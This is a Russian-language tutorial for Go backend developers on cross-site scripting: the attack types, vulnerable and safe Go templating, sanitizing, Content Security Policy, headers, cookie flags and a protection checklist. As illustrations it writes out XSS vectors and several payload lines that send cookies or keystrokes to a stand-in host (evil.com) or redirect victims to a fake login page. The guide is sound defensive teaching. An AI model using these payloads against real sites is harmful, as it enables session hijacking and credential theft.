# XSS (Cross-Site Scripting)

XSS — атака, при которой атакующий внедряет вредоносный JavaScript в страницу, которую видят другие пользователи. Когда жертва открывает страницу, скрипт выполняется в её браузере с её правами.

Backend разработчик скажет "это про фронтенд". Это ошибка: XSS возникает там, где сервер генерирует HTML или возвращает данные, которые потом вставляются в DOM. Большинство XSS-уязвимостей — на стороне backend.

## Содержание

- [Простая аналогия](#простая-аналогия)
- [Три типа XSS](#три-типа-xss)
- [Как работает атака](#как-работает-атака)
- [Защита: правильное экранирование](#защита-правильное-экранирование)
- [html/template в Go: безопасно по умолчанию](#htmltemplate-в-go-безопасно-по-умолчанию)
- [JSON API и XSS](#json-api-и-xss)
- [Content Security Policy (CSP)](#content-security-policy-csp)
- [Дополнительные заголовки](#дополнительные-заголовки)
- [Cookie защита](#cookie-защита)
- [Что атакующий может сделать через XSS](#что-атакующий-может-сделать-через-xss)
- [Известные инциденты](#известные-инциденты)
- [Чек-лист защиты](#чек-лист-защиты)

---

## Простая аналогия

Представь форму комментариев. Пользователь пишет: **`<script>alert('hi')</script>`**. Если сервер сохранил это и отдаёт другим пользователям как HTML — каждый увидевший комментарий получит alert. Это безобидный пример. Замени `alert` на код, отправляющий куки атакующему — и твой сайт уже работает на него.

**XSS — это смешение пользовательского ввода и HTML-кода.** Так же как SQL injection — смешение данных и SQL-кода. Атакующий вводит "данные", которые становятся "кодом" в чужом браузере.

---

## Три типа XSS

### 1. Stored XSS (persistent)

Самый опасный. Вредоносный код сохраняется в БД, выдаётся всем пользователям.

```
1. Атакующий пишет комментарий: <script>fetch('https://evil.com/?c='+document.cookie)</script>
2. Сервер сохраняет в БД как обычный текст
3. Другой пользователь открывает страницу
4. Сервер вставляет комментарий в HTML без экранирования
5. Браузер жертвы выполняет script → отправляет её куки атакующему
```

Вектор: комментарии, профили, имена в чате, отзывы, любые user-generated content.

### 2. Reflected XSS

Код передаётся в URL/параметрах запроса и сразу же возвращается в ответе.

```
1. Атакующий формирует ссылку: https://example.com/search?q=<script>...</script>
2. Шлёт её жертве (email, мессенджер, фишинг)
3. Жертва кликает
4. Сервер вставляет q в HTML страницы поиска (без экранирования)
5. Скрипт выполняется в браузере жертвы
```

Вектор: страницы поиска, error pages с echo'ом параметра, redirect-страницы.

### 3. DOM-based XSS

Сервер не виноват. Уязвимость на стороне JS-кода:

```javascript
// Уязвимый JS на странице
const name = new URL(location).searchParams.get("name");
document.getElementById("greeting").innerHTML = "Привет, " + name;

// Атака: example.com/page?name=<img src=x onerror=alert(1)>
```

Backend здесь не при чём, но важно знать что XSS бывает и такой — и фронтенд тоже надо проверять.

---

## Как работает атака

### Уязвимый Go-код

```go
// Сервер генерирует HTML вручную через fmt.Sprintf
func handleProfile(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    html := fmt.Sprintf("<h1>Привет, %s</h1>", name)
    w.Header().Set("Content-Type", "text/html")
    w.Write([]byte(html))
}
```

URL: `?name=<script>alert(document.cookie)</script>`
Ответ: `<h1>Привет, <script>alert(document.cookie)</script></h1>`
Браузер выполняет скрипт.

### Stored XSS через JSON API

```go
// API возвращает комментарий как plaintext
type Comment struct {
    Text string `json:"text"`
}

// Frontend (React) делает:
// element.innerHTML = comment.text   ← УЯЗВИМО
```

Если фронтенд использует `innerHTML` или `dangerouslySetInnerHTML` — вернётся XSS, даже если backend "просто хранит строку".

### Невидимые векторы

XSS прячется не только в `<script>`. Все эти примеры — рабочие XSS-векторы:

```html
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<style>@import 'javascript:alert(1)';</style>
```

Любой HTML-атрибут с приставкой `on*` (`onclick`, `onerror`, `onload`, `onmouseover`) выполняет JS. Любая URL-схема `javascript:` — выполняет код. Просто запрещать слово "script" — не работает.

---

## Защита: правильное экранирование

Принцип: **никогда не вставляй пользовательский ввод напрямую в HTML**. Вместо этого экранируй спецсимволы — `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;`, `&` → `&amp;`.

После экранирования `<script>` становится `&lt;script&gt;` — браузер видит это как текст, не как тег.

**Контекст имеет значение.** Экранирование зависит от того, куда вставляется значение:

| Контекст | Что экранировать |
|---|---|
| HTML body (`<div>...</div>`) | `< > & " '` |
| HTML attribute (`<div title="...">`) | `< > & " ' \` плюс кодировка |
| URL (`<a href="...">`) | URL-encoding + проверка схемы |
| JavaScript (`<script>var x = "..."</script>`) | JS string escaping + кавычки |
| CSS (`style="..."`) | CSS escaping |

Это сложно делать руками. Используй template engine, который знает контекст.

---

## html/template в Go: безопасно по умолчанию

Стандартная библиотека Go включает `html/template` — в отличие от `text/template`, она автоматически экранирует с учётом контекста.

```go
import "html/template"

const tpl = `
<h1>Привет, {{.Name}}!</h1>
<a href="{{.URL}}">профиль</a>
<script>var user = "{{.Name}}";</script>
`

func handleProfile(w http.ResponseWriter, r *http.Request) {
    t := template.Must(template.New("profile").Parse(tpl))

    data := struct {
        Name string
        URL  string
    }{
        Name: r.URL.Query().Get("name"),  // user input
        URL:  r.URL.Query().Get("url"),
    }

    t.Execute(w, data)
}
```

Что произойдёт:
- В `<h1>` — HTML escape: `<` → `&lt;`
- В `href` атрибуте — URL escape + проверка схемы (`javascript:` блокируется)
- В `<script>` — JS string escape

Если ты используешь `html/template` корректно (передаёшь данные через `{{.Field}}`, не конкатенируешь строки) — XSS практически невозможен.

### text/template — НЕ безопасен

```go
import "text/template"  // НЕ html/template!
// Не делает HTML escape — XSS возможен
```

`text/template` для генерации не-HTML (конфиги, скрипты, email-text). Для HTML — только `html/template`.

### Когда нужен "сырой HTML"

Иногда надо вставить готовый HTML (например, превью markdown). Используй `template.HTML`, но **только** если уверен что HTML безопасен:

```go
// Markdown → HTML через blackfriday или goldmark
unsafe := blackfriday.Run([]byte(userMarkdown))

// Прогнать через bluemonday — sanitizer
import "github.com/microcosm-cc/bluemonday"
policy := bluemonday.UGCPolicy()  // разрешает базовые теги, режет script
safe := policy.SanitizeBytes(unsafe)

// Только теперь — как HTML в шаблон
data.Content = template.HTML(safe)
```

**Никогда не делай `template.HTML(userInput)` напрямую** — это явно отключает защиту.

### bluemonday — sanitizer для UGC

```go
import "github.com/microcosm-cc/bluemonday"

// UGCPolicy — для пользовательского контента (комментарии, статьи)
p := bluemonday.UGCPolicy()
clean := p.Sanitize(userMarkdownHTML)

// StrictPolicy — режет вообще все теги
p := bluemonday.StrictPolicy()
plainText := p.Sanitize(userInput)
```

bluemonday — proven-safe, основан на whitelist подходе (разрешено только то, что явно указано).

---

## JSON API и XSS

Если backend возвращает JSON, и фронтенд правильно вставляет данные в DOM (через `textContent`, не `innerHTML`) — XSS не будет. Но есть ловушки:

### 1. JSON в HTML-странице

```html
<!-- Server-side rendered страница с initial state -->
<script>
  window.__INITIAL_STATE__ = {{.State}}
</script>
```

Если `State.UserName` = `</script><script>alert(1)`, и не сделан JS-escape — XSS. `html/template` это обрабатывает корректно, но только при правильном использовании.

### 2. JSONP

JSONP-callback'и часто уязвимы — атакующий контролирует имя callback функции:

```
https://api.example.com/data?callback=<script>alert(1)</script>
→ <script>alert(1)</script>(...)
```

Не используй JSONP в новом коде, используй CORS.

### 3. Content-Type matters

Всегда возвращай JSON с правильным Content-Type:

```go
w.Header().Set("Content-Type", "application/json; charset=utf-8")
json.NewEncoder(w).Encode(data)
```

Если вернёшь JSON с `Content-Type: text/html` — браузер интерпретирует как HTML, и `<script>` в данных выполнится. Это так называемый **MIME sniffing XSS**. Защита — `X-Content-Type-Options: nosniff` (см. ниже).

---

## Content Security Policy (CSP)

CSP — заголовок, говорящий браузеру: "загружай скрипты только отсюда, не выполняй inline JS, и т.д.". Это второй слой защиты — даже если XSS прошёл через экранирование, CSP не даст ему выполниться.

### Базовый CSP

```go
w.Header().Set("Content-Security-Policy",
    "default-src 'self'; "+
    "script-src 'self' https://cdn.example.com; "+
    "style-src 'self' 'unsafe-inline'; "+
    "img-src 'self' data: https:; "+
    "object-src 'none'; "+
    "base-uri 'self'; "+
    "frame-ancestors 'none';")
```

Что это значит:
- `default-src 'self'` — по умолчанию загружать только со своего origin
- `script-src 'self' https://cdn.example.com` — JS только со своего домена и доверенного CDN, **никаких inline `<script>`**
- `style-src 'self' 'unsafe-inline'` — CSS со своего домена + inline (часто нужно для UI)
- `img-src 'self' data: https:` — картинки со своего домена, data-URI, любого HTTPS
- `object-src 'none'` — никаких `<object>`/`<embed>`/`<applet>` (уязвимости в Flash и т.п.)
- `frame-ancestors 'none'` — нельзя встроить страницу в iframe (защита от clickjacking)

### nonce для inline-скриптов

Если нужен inline JS — использовать nonce:

```go
// Сгенерировать случайный nonce на каждый запрос
nonce := generateNonce()
w.Header().Set("Content-Security-Policy",
    fmt.Sprintf("script-src 'self' 'nonce-%s'", nonce))

// В шаблоне
<script nonce="{{.Nonce}}">
  // этот inline-скрипт будет выполнен
</script>

<script>alert(1)</script>
// этот — заблокирован, нет nonce
```

Атакующий не знает nonce заранее — его XSS-payload не будет иметь правильного nonce и не выполнится.

### Report-only mode для тестирования

```go
// Не блокирует, только репортит нарушения — для отладки CSP
w.Header().Set("Content-Security-Policy-Report-Only",
    "default-src 'self'; report-uri /csp-report")
```

Включи report-only, собери отчёты, посмотри что реально нужно — потом включи enforcing.

### Минусы CSP

- Сложно настроить для legacy-сайтов с inline JS
- Нужно исправлять весь код — не использовать `eval`, inline event handlers (`onclick="..."`)
- Третьесторонние скрипты (аналитика, реклама) усложняют политику

Но даже базовый CSP отрезает 80% реальных XSS-атак.

---

## Дополнительные заголовки

### X-Content-Type-Options

```go
w.Header().Set("X-Content-Type-Options", "nosniff")
```

Запрещает браузеру угадывать Content-Type. Без этого: ты вернул `Content-Type: text/plain`, но в данных HTML с `<script>` — старые браузеры могли "догадаться" что это HTML и выполнить.

### X-Frame-Options (устарел в пользу frame-ancestors в CSP)

```go
w.Header().Set("X-Frame-Options", "DENY")
// или SAMEORIGIN
```

Защита от clickjacking — атаки, где злоумышленник встраивает твой сайт в iframe и обманом заставляет пользователя кликать на скрытые элементы.

### Referrer-Policy

```go
w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
```

Контролирует что отправлять в Referer header при переходах. По умолчанию — может утекать токен из URL в реферер на сторонний сайт.

### Permissions-Policy (бывший Feature-Policy)

```go
w.Header().Set("Permissions-Policy",
    "camera=(), microphone=(), geolocation=()")
```

Запрещает API которыми ты не пользуешься.

---

## Cookie защита

Главная цель XSS — украсть session/auth cookie. Защити их:

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionToken,
    HttpOnly: true,    // ← КРИТИЧЕСКИ ВАЖНО — JS не может прочитать
    Secure:   true,    // только по HTTPS
    SameSite: http.SameSiteLaxMode,
    Path:     "/",
    MaxAge:   3600,
})
```

**`HttpOnly: true`** — cookie недоступна из JavaScript (`document.cookie` её не покажет). Даже если XSS произойдёт — атакующий не сможет вытащить session token. Это самый важный флаг для cookie с auth-токеном.

Подробнее про cookie атрибуты: [12-security/authentication/02-sessions-and-session-security.md](../authentication/02-sessions-and-session-security.md)

---

## Что атакующий может сделать через XSS

После того как XSS-payload выполнился в браузере жертвы — атакующий может почти всё что может сама жертва на этом сайте.

**1. Кража cookie / токенов.**
```javascript
fetch("https://evil.com/?cookie=" + document.cookie)
```
Получив session cookie, атакующий заходит как жертва. Если HttpOnly не выставлен — session уезжает атакующему.

**2. Действия от имени жертвы.**
```javascript
fetch("/api/transfer", {
    method: "POST",
    body: JSON.stringify({to: "attacker", amount: 1000000})
})
```
XSS обходит CSRF защиту — он работает в context самого сайта, с правильными cookie и токенами.

**3. Кейлоггер.**
```javascript
document.addEventListener("keypress", e => {
    fetch("https://evil.com/log?k=" + e.key);
});
```
Атакующий записывает всё что жертва вводит — включая пароли (если она логинится повторно).

**4. Defacement / редирект.**
```javascript
document.body.innerHTML = "<h1>Hacked</h1>";
window.location = "https://evil.com/fake-login";
```
Замена контента, фишинг через подмену форм.

**5. Crypto-mining в браузере.**
```javascript
// Подключить майнер и считать на машине пользователя
```

**6. Атака на внутреннюю сеть (если приложение работает в корпоративной сети).**
XSS даёт доступ к запросам с компьютера жертвы. Можно сканировать `192.168.*`, делать запросы к внутренним сервисам, эксплуатировать роутеры через CSRF.

**7. Worm-эффект (для stored XSS).**
Каждый кто видит инфицированный пост — получает payload, который автоматически постит то же самое в его профиле. Самораспространение по соцсети. Так распространялся Samy worm в MySpace.

---

## Известные инциденты

**Samy worm (MySpace, 2005).** Stored XSS в профилях MySpace. Скрипт автоматически добавлял Samy в друзья и копировал свой код в профиль каждой жертвы. За 20 часов — больше 1 миллиона заражений. Самый знаменитый XSS worm. Автору присудили срок и запрет на использование компьютера.

**Twitter onMouseOver (2010).** XSS через хитрый payload в твитах. Достаточно было навести мышь на твит — выполнялся JS, который ретвитил вредоносный твит. Распространение лавинообразно.

**British Airways (2018).** Через скрипт с скомпрометированной third-party библиотеки атакующие добавили скиммер на checkout-страницу. Утекли данные 380к карт. Штраф ICO £20 млн.

**Magecart-атаки (продолжаются с 2015 по сейчас).** Группа атакующих регулярно находит уязвимости в e-commerce (включая XSS) и добавляет скиммеры. Тысячи магазинов скомпрометированы — Ticketmaster, Newegg, Macy's и многие другие.

**Slack RCE через XSS (2019).** Stored XSS в Slack desktop приложении приводил к RCE — потому что Slack использует Electron, и XSS получает доступ к Node.js API. Bug bounty $1500.

---

## Чек-лист защиты

**Обязательно:**
- ✅ Использовать `html/template` (не `text/template`) для HTML-генерации
- ✅ Никогда не делать `template.HTML(userInput)` напрямую
- ✅ User-generated HTML — через bluemonday sanitizer
- ✅ JSON API — `Content-Type: application/json` строго
- ✅ Cookie с auth — `HttpOnly` и `Secure`
- ✅ `X-Content-Type-Options: nosniff` на всех ответах

**Сильно желательно:**
- ✅ Content Security Policy (минимум `default-src 'self'`)
- ✅ `frame-ancestors 'none'` (или CSP-эквивалент `X-Frame-Options: DENY`)
- ✅ `Referrer-Policy: strict-origin-when-cross-origin`
- ✅ Запрет inline JS — все скрипты через файлы или nonce

**На стороне frontend (даже если ты backend):**
- ✅ React/Vue/Angular — НЕ использовать `dangerouslySetInnerHTML`/`v-html` без sanitization
- ✅ Не использовать `innerHTML` руками — `textContent` если нужен plain text
- ✅ DOMPurify для sanitization на frontend

**Тестирование:**
- ✅ XSS-чек в SAST (gosec, Semgrep, CodeQL)
- ✅ Penetration testing с фокусом на UGC формы
- ✅ Bug bounty — XSS чаще всего находят именно через них

**Special case — AI-кодогенерация:**
- ✅ Особенно проверять template-код на использование `template.HTML()` — модели иногда суют его без понимания
- ✅ Проверять что HTTP-handlers ставят `X-Content-Type-Options: nosniff`
